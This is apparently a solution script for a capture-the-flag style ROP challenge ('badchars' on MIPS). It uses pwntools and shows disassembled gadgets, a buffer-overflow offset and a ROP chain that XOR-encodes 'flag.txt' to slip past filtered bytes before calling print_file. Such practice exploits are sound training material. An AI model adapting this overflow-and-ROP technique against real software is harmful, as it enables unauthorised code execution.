from pwn import *
context.binary = elf = ELF('badchars_mipsel')
offset = 36
'''
pop_t1_t0_t9_sw_t1_mt0_jt9
0x00400930      0c00b98f       lw t9, 0xc(sp)
0x00400934      0800a88f       lw t0, 8(sp)
0x00400938      0400a98f       lw t1, 4(sp)
0x0040093c      000009ad       sw t1, (t0)
0x00400940      09f82003       jalr t9
0x00400944      1000bd23       addi sp, sp, 0x10


pop_t1_t0_t9_xor_mt1_t0_jt9
0x00400948      0c00b98f       lw t9, 0xc(sp)
0x0040094c      0800a88f       lw t0, 8(sp)
0x00400950      0400a98f       lw t1, 4(sp)
0x00400954      00002a8d       lw t2, (t1)
0x00400958      26400a01       xor t0, t0, t2
0x0040095c      000028ad       sw t0, (t1)
0x00400960      09f82003       jalr t9
0x00400964      1000bd23       addi sp, sp, 0x10


pop_t9_a0_jt9
0x00400968      0800a48f       lw a0, 8(sp)
0x0040096c      0400b98f       lw t9, 4(sp)
0x00400970      09f82003       jalr t9
0x00400974      0c00bd23       addi sp, sp, 0xc


[Sections]
nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
18  0x00000ff0    0x8 0x00410ff0    0x8 -rw- .ctors
19  0x00000ff8    0x8 0x00410ff8    0x8 -rw- .dtors
20  0x00001000   0x10 0x00411000   0x10 -rw- .data
21  0x00001010    0x4 0x00411010    0x4 -rw- .rld_map
22  0x00001020   0x44 0x00411020   0x44 -rw- .got
23  0x00001064    0x4 0x00411064    0x4 -rw- .sdata
24  0x00001068    0x0 0x00411070   0x10 -rw- .bss



[0x00400930]> s sym.imp.print_file 
[0x00400ab0]> pdf
            ; UNKNOWN XREF from obj._DYNAMIC @ +0x2d4
            ; CALL XREF from main @ 0x4008b4
            ;-- section..MIPS.stubs:
            ;-- .MIPS.stubs:
            ;-- pwnme:
┌ 64: sym._MIPS_STUBS_ ();
...............................................
│           ;-- print_file:
│           0x00400ab0      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
│                                                                      ; [0x411020:4]=0
│           0x00400ab4      2578e003       move t7, ra
│           0x00400ab8      09f82003       jalr t9
...............................................
'''

pop_t1_t0_t9_sw_t1_mt0_jt9  = 0x00400930
pop_t1_t0_t9_xor_mt1_t0_jt9 = 0x00400948
pop_t9_a0_jt9               = 0x00400968

p_file = 0x00400ab0

where  = 0x00411000 # .data

xorKey = unpack(b'\x0f\x0f\x0f\x0f')

what1  = unpack(b'icnh') # 'flbh'  not work i need to use xor here
################ 'icnh' xor b'0f0f0f0f' -> flag
what2  = unpack(b'!{w{') # same for '/tyt'
################ '!{w{' xor b'0f0f0f0f' -> .txt




payload  = b'A'*offset
payload += p32(pop_t1_t0_t9_sw_t1_mt0_jt9)  + p32(0x0) + p32(what1)   + p32(where) 
payload += p32(pop_t1_t0_t9_sw_t1_mt0_jt9)  + p32(0x0) + p32(what2)   + p32(where+4)
payload += p32(pop_t1_t0_t9_xor_mt1_t0_jt9) + p32(0x0) + p32(where)   + p32(xorKey)
payload += p32(pop_t1_t0_t9_xor_mt1_t0_jt9) + p32(0x0) + p32(where+4) + p32(xorKey)
payload += p32(pop_t9_a0_jt9)               + p32(0x0) + p32(p_file)  + p32(where)



p =  elf.process()

p.recv()
p.sendline(payload)
log.info(p.recvall())

